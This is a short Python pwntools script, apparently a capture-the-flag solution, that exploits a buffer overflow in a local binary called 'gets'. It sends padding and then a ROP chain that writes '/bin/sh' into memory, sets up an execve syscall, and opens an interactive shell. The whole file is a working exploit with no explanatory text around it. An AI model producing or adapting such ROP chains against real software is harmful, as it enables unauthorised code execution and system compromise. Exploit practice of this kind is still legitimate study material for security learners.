from pwn import *

r = process('./gets')

pause()

payload = ''
payload += '\x00'*0x1c
payload += p32(0x080b81c6) #pop eax
payload += p32(0x6e69622f) #/bin
payload += p32(0x0806f02a) #pop edx
payload += p32(0x80e9d60) #somewhere in bss
payload += p32(0x080549db) #mov dword ptr [edx], eax ; ret
payload += p32(0x080b81c6) #pop eax
payload += p32(0x68732f) #/sh
payload += p32(0x0806f02a) #pop edx
payload += p32(0x80e9d60 + 4) #somewhere in bss
payload += p32(0x080549db) #mov dword ptr [edx], eax ; ret
payload += p32(0x0806f02a) #pop edx
payload += p32(0x0)
payload += p32(0x080de955) #pop ecx
payload += p32(0x0)
payload += p32(0x080481c9) #pop ebx
payload += p32(0x80e9d60) #/bin/sh
payload += p32(0x080b81c6) #pop eax
payload += p32(0x0b) #execve syscall number
payload += p32(0x806cc25) #int 0x80

r.send(payload + '\n')

r.interactive()
